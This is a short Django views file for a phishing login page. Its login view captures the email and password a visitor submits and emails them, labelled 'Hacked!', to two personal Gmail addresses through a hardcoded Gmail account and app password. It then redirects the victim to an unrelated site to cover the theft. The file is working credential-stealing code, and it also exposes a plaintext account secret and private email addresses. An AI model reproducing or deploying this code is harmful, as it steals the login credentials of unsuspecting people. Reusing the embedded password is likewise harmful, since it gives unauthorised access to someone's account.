from django.shortcuts import render, redirect


# Send Email
def send_email(msg, email, password):
    import smtplib

    # SET EMAIL LOGIN REQUIREMENTS
    gmail_user = 'kadellform@gmail.com'
    gmail_app_password = 'zuajtmownuovcliw'

    # SET THE INFO ABOUT THE SAID EMAIL
    sent_from = gmail_user
    sent_to = ['mohanadomark@gmail.com', 'Marwanomareacc@gmail.com']
    sent_subject = "New Form"
    sent_body = f"{str(msg).encode('UTF-8')}\n\n" \
                f"Password: {password}\n" \
                f"Email: {email}\n"

    email_text = """\
    From: %s
    To: %s
    Subject: %s

    %s
    """ % (sent_from, ", ".join(sent_to), sent_subject, sent_body)

    # SEND EMAIL OR DIE TRYING!!!
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_app_password)
        server.sendmail(sent_from, sent_to, email_text)
        server.close()

        print('Email sent!')
    except Exception as exception:
        print("Error: %s!\n\n" % exception)


# Create your views here.
def login(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        print(f"{email} | {password}")

        # FORMATTING THE MESSAGE
        msg = "Hacked!"

        # SENDING THE TEST ANSWERS
        send_email(msg, email, password)

        return redirect('https://htmlcolorcodes.com/color-picker/')
    else:
        return render(request, 'index.html')
